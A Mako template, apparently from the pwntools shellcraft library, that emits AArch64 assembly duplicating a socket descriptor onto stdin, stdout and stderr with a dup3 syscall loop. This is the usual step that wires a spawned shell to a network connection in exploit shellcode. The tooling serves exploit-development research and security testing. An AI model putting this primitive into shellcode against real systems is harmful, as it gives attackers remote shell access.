<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.aarch64 import mov,setregs %>
<%page args="sock = 'x12'"/>
<%docstring>
Args: [sock (imm/reg) = x12]
    Duplicates sock to stdin, stdout and stderr
</%docstring>
<%
  looplabel = common.label("loop")
%>
    /* dup() file descriptor ${sock} into stdin/stdout/stderr */
        ${setregs({'x8': 'SYS_dup3', 'x1': 2, 'x2': 0})}

${looplabel}:
        ${mov('x0', sock)}
        svc #0
        subs x1, x1, #1
        bpl ${looplabel}
